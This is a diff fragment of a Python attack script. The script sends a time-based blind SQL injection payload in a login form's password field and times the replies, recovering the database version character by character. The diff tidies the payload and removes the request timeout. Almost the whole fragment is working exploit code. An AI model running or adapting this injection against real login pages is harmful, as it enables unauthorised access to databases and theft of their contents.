@@ -19,11 +19,11 @@ def send_request(i):
     phpsessid = login_form.cookies.get("PHPSESSID")
     char_exists = False
 
-    data["password"] = "' UNION SELECT+IF(ASCII(SUBSTRING(VERSION(), " + str(iterator) + ", 1)) = " + str(i) + ", SLEEP(2), 1), null, null, null-- "
+    data["password"] = "' UNION SELECT IF(ASCII(SUBSTRING(VERSION(), " + str(iterator) + ", 1)) = " + str(i) + ", SLEEP(2), 1), null, null, null-- "
     # print(data["password"])
 
     start_time = time.time()
-    response = requests.post(url, data=data, proxies=proxies, cookies={"PHPSESSID": phpsessid}, timeout=5)
+    response = requests.post(url, data=data, proxies=proxies, cookies={"PHPSESSID": phpsessid})
     end_time = time.time()
     response_time = end_time - start_time
     # print(response_time)
